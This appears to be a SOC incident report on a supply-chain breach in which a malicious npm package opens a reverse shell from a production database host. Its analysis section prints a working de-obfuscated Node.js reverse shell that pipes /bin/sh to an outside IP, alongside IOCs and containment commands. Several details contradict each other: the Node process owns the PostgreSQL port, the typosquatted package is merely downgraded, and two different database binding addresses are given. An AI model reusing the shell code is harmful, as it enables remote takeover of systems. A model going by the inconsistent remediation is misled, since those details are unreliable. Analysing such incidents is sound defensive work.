# Senior Developer / SOC Lead Technical Report
**Incident ID**: INC-2026-8891  
**Severity**: CRITICAL  
**Category**: `supply_chain_rce_database_exposure`  
**Target Asset**: `prod-db-primary-01.local` (10.0.4.15)  

---

## 1. Technical Executive Summary
A critical multi-stage breach was detected on production database node `prod-db-primary-01.local`. An unauthenticated PostgreSQL interface (TCP port 5432) combined with a malicious typosquatted package (`@kvch-internal/crypto-utils` v1.4.2) enabled remote attacker execution of an obfuscated WebSockets reverse shell (`185.220.101.5:443`) via Node process PID 14209, allowing session token extraction.

## 2. Quantified Risk Metrics
- **Likelihood Score**: 92 / 100
- **Business Impact Score**: 88 / 100
- **Financial Exposure**:
  - Min: ₹15,00,000
  - Most Likely: ₹48,00,000
  - Max: ₹1,20,00,000
  - Expected Annual Loss (EAL): ₹38,40,000
- **Risk Trend**: Increasing

## 3. Key Findings & Indicators of Compromise (IOCs)
1. **Unauthenticated Listener**: PostgreSQL socket bound to `0.0.0.0:5432` without host restrictions.
2. **Malicious Package**: `@kvch-internal/crypto-utils@1.4.2` containing obfuscated `telemetry_worker.js`.
3. **C2 Egress Shell**: Active reverse TCP shell connected to `185.220.101.5:443` (PID 14209).
4. **Memory Entropy**: Heap dump entropy score 7.91 (High obfuscation / encrypted payloads).

---

## 4. Role-Specific Technical Detail (Code, Logs & Containment)

### Process & Network Socket Telemetry
```bash
$ netstat -tulpn | grep 5432
tcp        0      0 0.0.0.0:5432            0.0.0.0:*               LISTEN      14209/node

$ ps aux | grep 14209
node 14209 88.4 4.2 1420912 345012 ? Sl 17:12 24:15 node /app/node_modules/@kvch-internal/crypto-utils/dist/telemetry_worker.js --c2=185.220.101.5:443
```

### De-obfuscated Reverse Shell Payload Excerpt (`dist/telemetry_worker.js`)
```javascript
const net = require('net');
const cp = require('child_process');
const client = new net.Socket();

client.connect(443, '185.220.101.5', () => {
    const sh = cp.spawn('/bin/sh', []);
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
});
```

### Config & Code Remediation Diff (`/etc/postgresql/15/main/postgresql.conf` & `package.json`)
```diff
--- a/etc/postgresql/15/main/postgresql.conf
+++ b/etc/postgresql/15/main/postgresql.conf
-listen_addresses = '*'
+listen_addresses = 'localhost, 10.0.4.15'

--- a/web/package.json
+++ b/web/package.json
- "@kvch-internal/crypto-utils": "^1.4.2",
+ "@kvch-internal/crypto-utils": "1.4.1",
```

### Step-by-Step Containment Commands
```bash
# Step 1: Kill malicious C2 process
sudo kill -9 14209

# Step 2: Emergency firewall block on C2 IP
sudo iptables -A OUTPUT -d 185.220.101.5 -j DROP
sudo iptables -A INPUT -s 185.220.101.5 -j DROP

# Step 3: Restart database service on restricted interface
sudo systemctl restart postgresql
```

---

## 5. Recommended Technical Action Items
1. Kill PID `14209` and restrict `pg_hba.conf` / `postgresql.conf` binding to `127.0.0.1`.
2. Rollback `@kvch-internal/crypto-utils` to `1.4.1` and clear local npm cache.
3. Rotate all database master secrets and active session JWT keys.
